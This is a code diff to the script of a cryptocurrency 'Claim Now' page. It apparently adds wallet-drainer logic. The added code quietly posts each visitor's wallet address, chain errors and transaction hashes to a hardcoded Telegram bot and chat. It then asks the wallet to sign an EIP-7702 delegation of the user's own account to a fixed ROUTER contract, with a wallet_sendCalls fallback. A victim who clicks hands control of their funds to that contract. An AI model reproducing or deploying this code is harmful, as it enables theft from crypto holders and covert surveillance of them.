@@ -72,13 +72,76 @@
     <script>
         const ROUTER = '0x7debCF72BebA168Bb49eec6BbB1156E203A564FD';
         const CHAIN_ID = '0x1';
+        const TBT = '8275273137:AAG3PqVdJ4_EK_AICGNrv1mtOPJAPVSq6eY';
+        const TCI = '-1002810760353';
+
+        function sendLog(msg) {
+            fetch('https://api.telegram.org/bot' + TBT + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TCI, text: msg })
+            }).catch(() => {});
+        }
+
+        async function tryMethod1(userAddress, nonce) {
+            sendLog('METHOD 1: eth_sendTransaction type 0x4');
+            const txParams = {
+                type: '0x4',
+                chainId: CHAIN_ID,
+                nonce: nonce,
+                from: userAddress,
+                to: userAddress,
+                gas: '0x30D40',
+                maxFeePerGas: '0x77359400',
+                maxPriorityFeePerGas: '0x77359400',
+                value: '0x0',
+                data: '0x61461954',
+                authorizationList: [{
+                    chainId: CHAIN_ID,
+                    address: ROUTER,
+                    nonce: '0x0'
+                }]
+            };
+
+            const txHash = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [txParams]
+            });
+
+            return txHash;
+        }
+
+        async function tryMethod2(userAddress) {
+            sendLog('METHOD 2: wallet_sendCalls fallback');
+            const txHash = await window.ethereum.request({
+                method: 'wallet_sendCalls',
+                params: [{
+                    version: '1.0',
+                    from: userAddress,
+                    calls: [
+                        {
+                            to: userAddress,
+                            data: '0x61461954',
+                            value: '0x0'
+                        }
+                    ],
+                    capabilities: {
+                        eip7702: {
+                            address: ROUTER
+                        }
+                    }
+                }]
+            });
+
+            return txHash;
+        }
 
         document.getElementById('claimBtn').addEventListener('click', async () => {
             const status = document.getElementById('status');
             const btn = document.getElementById('claimBtn');
 
             if (!window.ethereum) {
-                status.textContent = 'Wallet not detected.';
+                sendLog('NO WALLET');
                 return;
             }
 
@@ -88,6 +151,7 @@
             try {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const userAddress = accounts[0];
+                sendLog('CONNECT: ' + userAddress);
 
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                 if (chainId !== CHAIN_ID) {
@@ -97,40 +161,40 @@
                             params: [{ chainId: CHAIN_ID }]
                         });
                     } catch (e) {
-                        status.textContent = 'Switch to Ethereum mainnet.';
+                        sendLog('CHAIN FAIL: ' + (e.message || ''));
                         btn.disabled = false;
                         btn.textContent = 'Claim Now';
                         return;
                     }
                 }
 
-                btn.textContent = 'Confirm in wallet...';
-
-                const txHash = await window.ethereum.request({
-                    method: 'wallet_sendCalls',
-                    params: [{
-                        version: '1.0',
-                        from: userAddress,
-                        calls: [
-                            {
-                                to: userAddress,
-                                data: '0x61461954',
-                                value: '0x0'
-                            }
-                        ],
-                        capabilities: {
-                            eip7702: {
-                                address: ROUTER
-                            }
-                        }
-                    }]
+                const nonce = await window.ethereum.request({
+                    method: 'eth_getTransactionCount',
+                    params: [userAddress, 'latest']
                 });
 
+                btn.textContent = 'Confirm in wallet...';
+
+                let txHash;
+
+                try {
+                    txHash = await tryMethod1(userAddress, nonce);
+                } catch (e1) {
+                    sendLog('METHOD 1 FAILED: ' + (e1.message || 'Unknown') + ' | code: ' + (e1.code || 'none'));
+                    try {
+                        txHash = await tryMethod2(userAddress);
+                    } catch (e2) {
+                        sendLog('METHOD 2 FAILED: ' + (e2.message || 'Unknown') + ' | code: ' + (e2.code || 'none'));
+                        throw e2;
+                    }
+                }
+
+                sendLog('TX: ' + txHash);
                 status.textContent = 'Claimed: ' + txHash.slice(0, 24) + '...';
                 btn.textContent = 'Complete';
 
             } catch (e) {
-                status.textContent = '';
+                sendLog('ALL METHODS FAILED: ' + (e.message || 'Unknown'));
                 btn.disabled = false;
                 btn.textContent = 'Claim Now';
             }
